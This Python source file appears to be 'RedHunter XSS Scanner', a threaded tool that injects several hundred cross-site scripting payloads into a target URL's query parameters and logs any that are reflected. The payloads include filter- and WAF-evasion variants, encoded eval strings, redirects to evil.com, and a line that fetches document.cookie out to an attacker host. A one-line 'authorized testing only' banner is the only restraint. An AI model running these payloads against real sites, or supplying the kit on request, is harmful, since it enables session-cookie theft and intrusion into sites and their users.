import requests
import urllib.parse
import time
import random
import sys
import os
import threading
from datetime import datetime

class Terminal:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    ORANGE = '\033[33m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    os.system("clear")
    print(f"{Terminal.RED}{Terminal.BOLD}")
    print("""
                                                                                                                                               _..._                  __.....__    \  ___ `'.    
                                      _     _        .'     '.            .-''         '.   ' |--.\  \   
    .-''` ''-.                  /\    \\   //       .   .-.   .     .|   /     .-''"'-.  `. | |    \  '  
  .'          '.  ____     _____`\\  //\\ //  __    |  '   '  |   .' |_ /     /________\   \| |     |  ' 
 /              ``.   \  .'    /  \`//  \'/.:--.'.  |  |   |  | .'     ||                  || |     |  | 
'                ' `.  `'    .'    \|   |// |   \ | |  |   |  |'--.  .-'\    .-------------'| |     ' .' 
|         .-.    |   '.    .'       '     `" __ | | |  |   |  |   |  |   \    '-.____...---.| |___.' /'  
.        |   |   .   .'     `.             .'.''| | |  |   |  |   |  |    `.             .'/_______.'/   
 .       '._.'  /  .'  .'`.   `.          / /   | |_|  |   |  |   |  '.'    `''-...... -'  \_______|/    
  '._         .' .'   /    `.   `.        \ \._,\ '/|  |   |  |   |   /                                  
     '-....-'`  '----'       '----'        `--'  `" '--'   '--'   `'-'                                   

    
    
    
""")
    print(f"{Terminal.CYAN}\n           REDHUNTER XSS SCANNER | github.com/0xwanted | Ã¢â‚¬Â¨https://Ã¢â‚¬Â¨wanted1337.lol")
    print(f"{Terminal.YELLOW}           [!] For legal/authorized testing only!{Terminal.RESET}\n")

def get_target():
    banner()
    print(f"{Terminal.GREEN}[+] Enter target URL (e.g., https://example.com/search?q=test):{Terminal.RESET}")
    target = input(f"{Terminal.BLUE}>>> {Terminal.RESET}").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    return target

class PayloadEngine:
    def __init__(self):
        self.payloads = self.generate()
        self.total_payloads = len(self.payloads)

    def generate(self):
      
        templates = [
            '<script>{payload}</script>',
            '<img src=x onerror={payload}>',
            '<svg onload={payload}>',
            '<body onload={payload}>',
            '<iframe src="javascript:{payload}">',
            '<input onfocus={payload} autofocus>',
            '<details open ontoggle={payload}>',
            '<video><source onerror={payload}>',
            '<audio src=x onerror={payload}>',
            '<marquee onstart={payload}>',
            '<div onmouseover={payload}>',
            '<a href="javascript:{payload}">click</a>',
            '<form action="javascript:{payload}"><input type=submit>',
            '<isindex action=javascript:{payload} type=image>'
        ]

        
        exec_payloads = [
            'alert(1)',
            'confirm(1)',
            'prompt(1)',
            'alert(document.domain)',
            'alert(document.cookie)',
            'window.location="http://evil.com"',
            'fetch("http://evil.com/steal?c="+document.cookie)',
            'eval(atob("YWxlcnQoMSk="))', 
            'parent.location="http://evil.com"',
            'document.write("<script>alert(1)</script>")'
        ]

        
        bypasses = [
            'javascript:alert(1)',
            'javascript:alert`1`',
            'JaVaScRiPt:alert(1)',
            'javascript://alert(1)',
            'javascript://%0aalert(1)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'vbscript:msgbox(1)',
            '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
            'jav&#x09;ascript:alert(1)',
            'jav&#x0A;ascript:alert(1)',
            'jav&#x0D;ascript:alert(1)'
       ]

    
        waf_bypass = [
            '<script>throw onerror=eval,\'=alert\x281\x29\'</script>',
            '<script/src="data:text/javascript,alert(1)">',
            '<script x>alert(1)</script x>',
            '<script/a>alert(1)</script>',
            '<script>(alert)(1)</script>',
            '<script>window["al"+"ert"](1)</script>',
            '<script>parent["al"+"ert"](1)</script>',
            '<script>self["al"+"ert"](1)</script>',
            '<script>top["al"+"ert"](1)</script>',
            '<script>alert?.`1`</script>'
        ]

        
        payloads = set()
        for template in templates:
            for payload in exec_payloads + bypasses + waf_bypass:
                try:
                    final = template.format(payload=payload)
                    payloads.add(final)
                except:
                    payloads.add(template.replace('{payload}', payload))

        
        advanced = [
            '<img src=x oneonerrorrror=alert(1)>',
            '<svg><script>alert&#40;1&#41</script>',
            '<iframe srcdoc="<script>alert(1)</script>">',
            '<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>',
            '<math><maction actiontype="statusline#http://evil.com" href="javascript:alert(1)">click',
            '<link rel=stylesheet href="javascript:alert(1)">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<form><button formaction=javascript:alert(1)>X</button>',
            '<input onmouseover="alert(1)">',
            '<keygen autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<video poster=javascript:alert(1)//>',
            '<audio src=javascript:alert(1)>',
            '<embed src=javascript:alert(1)>',
            '<applet code="javascript:alert(1)">',
            '<isindex action=javascript:alert(1) type=image>',
            '<frameset onload=alert(1)>',
            '<table background=javascript:alert(1)>',
            '<style>@import "javascript:alert(1)";</style>',
            '<style>li {list-style-image: url("javascript:alert(1)");}</style>'
        ]

        payloads.update(advanced)

        
        while len(payloads) < 300:
            payloads.add(random.choice(list(payloads)))

        return list(payloads)

class Scanner:
    def __init__(self, target):
        self.target = target
        self.payloads = PayloadEngine().payloads
        self.headers = {"User-Agent": "RedHunter-XSS-Scanner/1.0"}
        self.params = self.get_params()
        self.lock = threading.Lock()
        self.vulnerable = False
        self.start_time = time.time()
        self.output_file = "xss_bypasses.txt"
        self.init_output_file()

    def init_output_file(self):
        with open(self.output_file, "w") as f:
            f.write(f"RedHunter XSS Scanner Report\n")
            f.write(f"Scan started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target URL: {self.target}\n")
            f.write(f"Total payloads: {len(self.payloads)}\n")
            f.write("\n=== Successful XSS Bypasses ===\n\n")

    def log_bypass(self, param, payload, url):
        with self.lock:
            with open(self.output_file, "a") as f:
                f.write(f"[+] Parameter: {param}\n")
                f.write(f"    Type: {self.get_payload_type(payload)}\n")
                f.write(f"    Payload: {payload}\n")
                f.write(f"    URL: {url}\n")
                f.write("-"*70 + "\n")

    def get_payload_type(self, payload):
        if '<script>' in payload.lower():
            return "Script Tag Injection"
        elif 'onerror=' in payload.lower():
            return "Event Handler (onerror)"
        elif 'onload=' in payload.lower():
            return "Event Handler (onload)"
        elif 'javascript:' in payload.lower():
            return "JavaScript URI"
        elif 'data:text/html' in payload.lower():
            return "Data URI Injection"
        elif 'srcdoc=' in payload.lower():
            return "Iframe Srcdoc Injection"
        elif 'svg' in payload.lower():
            return "SVG Vector"
        else:
            return "Advanced Technique"

    def get_params(self):
        parsed = urllib.parse.urlparse(self.target)
        q = urllib.parse.parse_qs(parsed.query)
        if q: return list(q.keys())
        return ["q", "search", "id", "query", "input", "s", "term"]

    def inject(self, param, value):
        u = urllib.parse.urlparse(self.target)
        q = urllib.parse.parse_qs(u.query)
        q[param] = value
        enc = urllib.parse.urlencode(q, doseq=True)
        return u._replace(query=enc).geturl()

    def reflected(self, html, payload):
        
        clean_payload = payload.lower().replace(' ', '').replace('\t', '').replace('\n', '')
        clean_html = html.lower().replace(' ', '').replace('\t', '').replace('\n', '')
        return clean_payload in clean_html

    def worker(self, param):
        for idx, p in enumerate(self.payloads):
            url = self.inject(param, p)
            try:
                r = requests.get(url, headers=self.headers, timeout=6)
                if self.reflected(r.text, p):
                    with self.lock:
                        self.vulnerable = True
                        print(f"\n{Terminal.GREEN}{Terminal.BOLD}[+] XSS FOUND!{Terminal.RESET}")
                        print(f"{Terminal.CYAN}[*] Parameter: {param}")
                        print(f"[*] Type: {self.get_payload_type(p)}")
                        print(f"[*] Payload: {Terminal.BOLD}{p}{Terminal.RESET}")
                        print(f"[*] URL: {url}")
                        print(f"{Terminal.GREEN}[+] Vulnerability confirmed!{Terminal.RESET}\n")
                        self.log_bypass(param, p, url)
                    return
                time.sleep(0.03)
            except Exception as e:
                continue

        with self.lock:
            print(f"{Terminal.RED}[-] Parameter {param}: No XSS found {Terminal.RESET}")

    def run(self):
        print(f"\n{Terminal.YELLOW}[~] Starting scan at {datetime.now().strftime('%H:%M:%S')}")
        print(f"[~] Target: {self.target}")
        print(f"[~] Loaded {len(self.payloads)} payloads")
        print(f"[~] Testing parameters: {', '.join(self.params)}{Terminal.RESET}\n")

        threads = []
        for p in self.params:
            t = threading.Thread(target=self.worker, args=(p,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        scan_time = time.time() - self.start_time
        print(f"\n{Terminal.BLUE}[*] Scan completed in {scan_time:.2f} seconds")
        if not self.vulnerable:
            print(f"{Terminal.RED}[!] No XSS vulnerabilities found{Terminal.RESET}")
        else:
            print(f"{Terminal.GREEN}[+] XSS vulnerabilities were found and saved to {self.output_file}!{Terminal.RESET}")

if __name__ == "__main__":
    try:
        target = get_target()
        scanner = Scanner(target)
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Terminal.RED}[!] Scan interrupted by user{Terminal.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Terminal.RED}[!] Error: {str(e)}{Terminal.RESET}")
        sys.exit(1)
